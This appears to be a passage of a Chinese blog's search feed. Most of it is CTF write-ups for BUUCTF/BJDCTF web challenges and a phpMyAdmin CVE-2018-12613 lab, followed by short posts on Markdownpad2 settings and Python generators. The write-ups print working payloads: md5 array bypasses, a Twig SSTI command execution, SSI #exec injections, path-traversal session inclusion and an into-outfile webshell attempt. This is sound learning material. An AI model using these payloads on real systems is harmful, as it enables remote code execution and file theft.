class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// wow, glzjin wants a girl friend.</span></code></pre><p>数组绕过<code>http://2cef2e26-08ad-44ad-938c-10498dad8ab0.node3.buuoj.cn/levels91.php?a[]=1&amp;b[]=2</code></p><p>下一页面</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>post数组绕过<code>param1[]=1&amp;param2[]=2</code></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>显示网站界面，使用dirmap扫描到目录<code>http://02b87379-34da-48ba-8bf7-e98327689a95.node3.buuoj.cn/.git/config</code></p><p>有git泄露，使用githack得到源码（githack使用的是python2，而且有时候恢复地不全，需要多恢复几次）</p><p>flag.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string">'yds'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> $<span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></code></pre><p>考察变量覆盖<code>http://2778652f-ca93-4bd4-a661-53f90a9abd3d.node3.buuoj.cn/?yds=flag</code></p><p>第二个foreach将$yds赋值为$flag，然后不设置post和get中的flag参数，就直接退出并返回$yds,也就是赋值的flag</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="../../../../medias/img/image-20200916110059759.png" alt="image-20200916110059759"></p><p>查看hint</p><p><img src="../../../../medias/img/image-20200916110022260.png" alt="image-20200916110022260"></p><p>获取ip的方式，网上有很多php获取ip的代码，大同小异，很多都获取了xxf和XFF或Client-IP这两个header作为ip，这两个都可以通过header伪造</p><p><img src="../../../../medias/img/image-20200916110328359.png" alt="image-20200916110328359"></p><p>发现ssti</p><p><img src="../../../../medias/img/image-20200916110423473.png" alt="image-20200916110423473"></p><p>获得flag</p><p><img src="../../../../medias/img/image-20200916112411831.png" alt="image-20200916112411831"></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="../../../../medias/img/image-20200916153437603.png" alt="image-20200916153437603"></p><p>hint</p><p><code>Why not take a closer look at cookies?</code></p><p>发现ssti</p><p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">学习链接</a></p><p><img src="../../../../medias/img/image-20200916153250680.png" alt="image-20200916153250680"></p><p>经测试为twig模板</p><pre><code>user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><p>获得flag</p><p><img src="../../../../medias/img/image-20200916170823820.png" alt="image-20200916170823820"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>访问index.php.swp获取源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>        <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Random 5 times</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> '            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span>    <span class="token punctuation">{</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token delimiter">?></span></code></pre><p>要满足密码md5加密后的前；六位等于<code>6d0bc1</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlibi<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token operator">=</span>md5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> md5<span class="token operator">==</span><span class="token string">"6d0bc1"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span>    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span></code></pre><p>跑出密码<code>2020666</code></p><p>登录</p><p><img src="../../../../medias/img/image-20200916181329097.png" alt="image-20200916181329097"></p><p><img src="../../../../medias/img/image-20200916181253933.png" alt="image-20200916181253933"></p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">ssi注入</a></p><p>将用户名改为<code>&lt;!--#exec cmd="ls ../"--&gt;</code></p><p><img src="../../../../medias/img/image-20200916181648989.png" alt="image-20200916181648989"></p><p><code>&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--&gt;</code></p><p><img src="../../../../medias/img/image-20200916181934904.png" alt="image-20200916181934904"></p><h1 id="real"><a href="#real" class="headerlink" title="real"></a>real</h1><h2 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h2><p><a href="https://blog.csdn.net/qq_45158261/article/details/107760856" target="_blank" rel="noopener">1</a></p><p><a href="https://blog.csdn.net/qq_33020901/article/details/80829269?https:%252f%252fblog.csdn.net%252fqq_33020901%252farticle%252fdetails%252f80829269" target="_blank" rel="noopener">2</a></p><p>先执行sql语句</p><blockquote><p>select ‘<!--?php phpinfo()?-->‘</p></blockquote><p>然后查看cookie，进行session包含，查看绝对路径</p><blockquote><p>index.php?target=db_sql.php%253f/../../../../../../../../../../../tmp/sess_+之前记录的<br>cookie</p></blockquote><p><img src="../../../../medias/img/image-20200812205749337.png" alt="image-20200812205749337"></p><p>然后写shell</p><blockquote><p>select ‘’ into outfile ‘/var/www/html/1.php’</p></blockquote><p>发现写不了</p><p>原来flag就在PHP info中</p><p><img src="../../../../medias/img/image-20200812210315524.png" alt="image-20200812210315524"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Markdownpad2插入多行代码问题</title>
      <link href="/2020/01/20/jie-jue-markdownpad2-cha-ru-duo-xing-dai-ma-wen-ti/"/>
      <url>/2020/01/20/jie-jue-markdownpad2-cha-ru-duo-xing-dai-ma-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>用Markdownpad2写博客时换行总是要用<code>&lt;p&gt;</code>,并且插入多行代码时特别不方便，以为本就是这么麻烦，后面 才发现原来是设置的问题</p><blockquote><p>ps: 主力已换typora，建议直接typora，markdowndpad2需要额外安装插件，并且占用内存较大，对表格和图片等插入的支持较弱。</p></blockquote><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>工具=&gt;选项=&gt;Markdown<br><img src="https://s2.ax1x.com/2020/01/20/1iUDhV.png"><br>选择<strong>Github风格Markdown（离线）</strong>即可<br>然后编写就极为方便了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 小问题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python中的yield</title>
      <link href="/2020/01/20/python-zhong-de-yield/"/>
      <url>/2020/01/20/python-zhong-de-yield/</url>
      
        <content type="html"><![CDATA[<p>讲到yield就要先说一下生成器：在Python中，一边循环一边计算的机制，称为生成器：generator。<br>也就是说，它并不是一回计算货创建出所有目标，而是有需要的适合再计算创建，作用就是减少内存占用。</p><h1 id="创建生成器"><a href="#创建生成器" class="headerlink" title="创建生成器"></a>创建生成器</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>把一个列表生成式的[]改成()：</p><pre><code>&gt;&gt;&gt; L = [x * x for x in range(10)]&gt;&gt;&gt; L[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]&gt;&gt;&gt; g = (x * x for x in range(10))&gt;&gt;&gt; g&lt;generator object &lt;genexpr&gt; at 0x1022ef630&gt;</code></pre><p>可以看出L是一个list，而g是一个generator<br>可以通过next()函数获得g的下一个返回值：</p><pre><code>&gt;&gt;&gt; next(g)0&gt;&gt;&gt; next(g)1&gt;&gt;&gt; next(g)4&gt;&gt;&gt; next(g)9</code></pre><p>或者直接利用循环：</p><pre><code>&gt;&gt;&gt; for n in g:...     print(n)... 0149162536496481</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>在函数中使用yield，如果一个函数中包含yield关键字，那么这个函数就不再是一个普通函数，而是一个generator。调用函数就是创建了一个生成器（generator）对象。</p><h1 id="关键字yield"><a href="#关键字yield" class="headerlink" title="关键字yield"></a>关键字yield</h1><p>yield相当于 return 返回一个值，并且记住这个返回的位置，下次迭代时，代码从yield的下一条语句开始执行。<br>我们可以暂时将它理解为return，当程序遇到他时返回特定值，然后程序暂停运行。</p><h2 id="EX"><a href="#EX" class="headerlink" title="EX:"></a>EX:</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token number">3</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>a<span class="token operator">=</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>运行结果：</p><blockquote><p>3</p></blockquote><p>那我们在加一个<code>print(next(a))</code>呢</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token number">3</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>a<span class="token operator">=</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>运行结果</p><blockquote><p>3<br>test<br>3</p></blockquote><p>结果符合上面描述</p><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><p>当我们处理数据时，生成器就用的比较多了<br>比如我们写一个爬虫，返回处理后的数据保存为文件时，就可以使用生成器，利用循环依次返回并写入数据</p><h2 id="EX-1"><a href="#EX-1" class="headerlink" title="EX:"></a>EX:</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#解析数据函数</span><span class="token keyword">def</span> <span class="token function">parse_result</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token punctuation">{</span>            <span class="token string">'1'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'2'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'3'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">write_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#省略函数内容</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#请求</span>items1 <span class="token operator">=</span> parse_result<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#调用解析函数</span><span class="token comment" spellcheck="true">#main（）区</span><span class="token keyword">for</span> item <span class="token keyword">in</span> items1<span class="token punctuation">:</span>    write_file<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将内容写入文件</span></code></pre><p>items1是一个生成器，在main（）区中通过for循环一步步返回数据到item中，然后载写入文件中<br>若把yield换成return就不可行了，return返回一次函数就结束了。</p><h4 id="return与yield的区别："><a href="#return与yield的区别：" class="headerlink" title="return与yield的区别："></a>return与yield的区别：</h4><blockquote><p>1，return只能返回一次函数就彻底结束了。而yield能返回多次值。<br>2，yield把函数变成生成器—迭代器—&gt;把iter，next方法给到函数了。为我们自己定义迭代器，提供了方便。<br>3，yield能保存函数在暂停，和继续下一次运行的状态。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
